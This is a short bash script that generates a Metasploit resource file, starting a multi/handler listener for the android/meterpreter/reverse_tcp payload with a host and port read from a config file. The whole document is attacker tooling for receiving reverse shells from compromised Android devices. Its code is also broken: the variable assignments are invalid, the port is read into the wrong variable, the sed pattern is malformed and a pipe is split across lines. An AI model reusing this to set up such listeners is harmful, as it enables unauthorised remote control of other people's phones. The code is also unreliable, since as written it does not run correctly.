#!/bin/bash

sudo touch meterpreter.rc
sudo echo use exploit/multi/handler >> meterpreter.rc
sudo echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc

sudo listen_host = cat config_payload.ini | grep Listen_Host | sed -E 's/(.*)={1](.*)/\2/'
sudo listen_host = cat config_payload.ini | grep Listen_Port
| sed -E 's/(.*)={1](.*)/\2/'

sudo echo set LHOST $listen_host >> meterpreter.rc
sudo echo set LPORT $listen_port >> meterpreter.rc
sudo echo exploit -j -z >> meterpreter.rc
